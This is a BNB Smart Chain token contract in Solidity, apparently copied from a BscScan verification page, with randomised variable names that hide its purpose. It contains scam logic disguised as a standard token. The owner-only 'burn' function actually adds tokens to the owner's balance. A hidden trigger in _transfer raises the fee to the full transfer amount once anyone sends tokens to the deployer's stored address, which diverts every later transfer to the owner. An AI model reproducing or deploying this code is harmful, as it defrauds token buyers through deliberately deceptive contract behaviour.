/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 16:10
 */
pragma solidity >=0.4.11;
contract EdgIcU {
mapping (address => uint256) public balanceOf;
uint256 public  iPVrZF = 100000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  TdULEv = address(0);
uint256 public  KuyvFG = 10000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  sJyfIR = 100000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
address public  yPcyvA = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  IYRQlv = 100000000000000000000000;
string public  symbol = "PaXgXb";
string public  name = "iPJSGW";
address public  tErpiD = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant zsLfns = 9+1;
uint256 public  iaZYBb = 1000000000000000000;
address public  gxOcPQ = address(0);
address private  CVvzXB = address(0);
uint256 public  eLEnJM = 10000000000000000000000000000;
uint256 private  RPFuLp = 10000000000000;
address public  YdPlwp = address(0);
address public  zRBTsu = address(0);
uint256 public  CjRgux = 10000000000000000000;
uint8 public constant decimals = 18;
uint256 public  MflfHl = 100000000000000000000000;
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () public {
CVvzXB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "IbeiWG");
require(to != address(0), "IbeiWG");
require(amount <= balanceOf[from], "IbeiWG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* zsLfns/RPFuLp ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==CVvzXB){
RPFuLp = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}